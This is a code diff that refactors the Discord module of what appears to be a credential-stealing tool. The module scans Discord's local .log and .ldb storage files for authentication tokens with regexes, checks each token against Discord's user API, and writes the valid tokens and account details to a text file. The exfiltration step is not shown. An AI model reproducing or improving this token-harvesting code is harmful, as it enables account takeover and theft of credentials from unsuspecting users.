@@ -1,8 +1,9 @@
 from re import findall
 from json import loads
 from os import listdir, path, mkdir
+from urllib.request import Request, urlopen
 
-from ..utils.config import http, DiscordConfig
+from ..utils.config import DiscordConfig
 
 
 class Discord:
@@ -16,8 +17,10 @@ class Discord:
 
     def __create_folder(self):
 
-        if not path.exists(rf"{self.storage_path}\{self.storage_folder}\{self.folder}"):
-            mkdir(rf"{self.storage_path}\{self.storage_folder}\{self.folder}")
+        folder = rf"{self.storage_path}\{self.storage_folder}\{self.folder}"
+
+        if not path.exists(folder):
+            mkdir(folder)
 
     def __check_tokens(self):
 
@@ -40,30 +43,32 @@ class Discord:
 
         valid = []
         invalid = []
+        tokens = []
 
         for file in listdir(self.config.TokensPath):
+
             if file[-4:] not in [".log", ".ldb"]:
                 continue
 
             for data in [line.strip() for line in open(rf"{self.config.TokensPath}\{file}", "r", errors="ignore", encoding="utf-8").readlines()]:
                 for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
-                    try:
-                        [valid.append(request) if request[1].status == 200 else invalid.append(request) for request in
-                            [(token,
-                                http.request(method="GET", url="https://discordapp.com/api/v6/users/@me", headers=self.__get_headers(token)))
-                                for token in findall(regex, data)
-                            ]
-                        ]
-                    except:
-                        continue
+                    [tokens.append(item) for item in findall(regex, data)]
+
+        for token in tokens:
+
+            try:
+                query = urlopen(Request(method="GET", url="https://discordapp.com/api/v6/users/@me", headers=self.__get_headers(token)))
+                valid.append((token, query))
+            except:
+                invalid.append(token)
 
         with open(rf"{self.storage_path}\{self.storage_folder}\{self.folder}\Discord.txt", "a", encoding="utf-8") as discord:
 
-            discord.write("Invalid tokens:\n" + "\n".join(item[0] for item in invalid) + "\n\nValid tokens:\n")
+            discord.write("Invalid tokens:\n" + "\n".join(item for item in invalid) + "\n\nValid tokens:\n")
 
             for result in valid:
 
-                data = loads(result[1].data.decode())
+                data = loads(result[1].read().decode("utf-8"))
 
                 info = (
                     f"Username: {data['username'] if data['username'] else 'No data'}",
